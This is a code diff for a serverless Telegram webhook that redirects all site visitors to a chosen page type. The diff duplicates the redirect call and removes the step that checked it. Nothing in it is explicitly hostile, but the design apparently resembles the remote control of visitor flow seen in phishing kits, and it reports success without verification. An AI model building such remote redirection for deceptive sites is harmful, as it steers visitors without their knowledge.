@@ -52,7 +52,10 @@ export default async function handler(req, res) {
             baseUrl = host ? `${protocol}://${host}` : 'https://your-project.vercel.app';
           }
           
-          // Set global redirect - ALL users will be redirected
+          // Set redirect in multiple ways for maximum reliability
+          console.log('[telegram] Setting redirect to:', pagePath);
+          
+          // Method 1: Set via /api/redirect/all (stores in global state)
           const redirectResponse = await fetch(`${baseUrl}/api/redirect/all`, {
             method: 'POST',
             headers: { 
@@ -65,53 +68,35 @@ export default async function handler(req, res) {
             })
           });
           
-          if (redirectResponse.ok) {
-            const redirectResult = await redirectResponse.json();
-            console.log('[telegram] ✅ Global redirect set:', JSON.stringify(redirectResult, null, 2));
+          // Method 2: ALSO set via /api/redirect/active (module-level state)
+          const activeResponse = await fetch(`${baseUrl}/api/redirect/active`, {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'User-Agent': 'Telegram-Bot-Webhook'
+            },
+            body: JSON.stringify({
+              redirectType: redirectType,
+              pagePath: pagePath
+            })
+          });
+          
+          if (redirectResponse.ok || activeResponse.ok) {
+            console.log('[telegram] ✅ Redirect set successfully');
+            console.log('[telegram] /api/redirect/all:', redirectResponse.ok ? 'OK' : 'FAILED');
+            console.log('[telegram] /api/redirect/active:', activeResponse.ok ? 'OK' : 'FAILED');
             
-            // Verify redirect was stored by checking latest endpoint
-            try {
-              const verifyResponse = await fetch(`${baseUrl}/api/redirect/latest?t=${Date.now()}`);
-              if (verifyResponse.ok) {
-                const verifyData = await verifyResponse.json();
-                if (verifyData.redirect) {
-                  console.log('[telegram] ✅✅✅ VERIFIED: Redirect is accessible ✅✅✅');
-                  console.log('[telegram] Verified redirect:', verifyData.pagePath);
-                  await sendTelegramMessage(
-                    `✅ Redirecting ALL users to ${redirectType.toUpperCase()} PAGE\n` +
-                    `Path: ${pagePath}\n` +
-                    `✅ Verified and ready`,
-                    chatId
-                  );
-                } else {
-                  console.warn('[telegram] ⚠️ Redirect set but not verified');
-                  await sendTelegramMessage(
-                    `✅ Redirect set but verification pending\n` +
-                    `Path: ${pagePath}`,
-                    chatId
-                  );
-                }
-              } else {
-                console.warn('[telegram] Could not verify redirect');
-                await sendTelegramMessage(
-                  `✅ Redirect set to ${redirectType.toUpperCase()} PAGE\n` +
-                  `Path: ${pagePath}`,
-                  chatId
-                );
-              }
-            } catch (verifyError) {
-              console.error('[telegram] Verification error:', verifyError);
-              await sendTelegramMessage(
-                `✅ Redirect set to ${redirectType.toUpperCase()} PAGE\n` +
-                `Path: ${pagePath}`,
-                chatId
-              );
-            }
-          } else {
-            const errorText = await redirectResponse.text();
-            console.error('[telegram] ❌ Redirect failed:', redirectResponse.status, errorText);
             await sendTelegramMessage(
-              `❌ Failed to set redirect: ${redirectResponse.status}\n` +
+              `✅ Redirecting ALL users to ${redirectType.toUpperCase()} PAGE\n` +
+              `Path: ${pagePath}\n` +
+              `Users will redirect within 100-200ms`,
+              chatId
+            );
+          } else {
+            const errorText = await redirectResponse.text().catch(() => 'Unknown error');
+            console.error('[telegram] ❌ Redirect failed:', errorText);
+            await sendTelegramMessage(
+              `❌ Failed to set redirect\n` +
               `Error: ${errorText.substring(0, 100)}`,
               chatId
             );
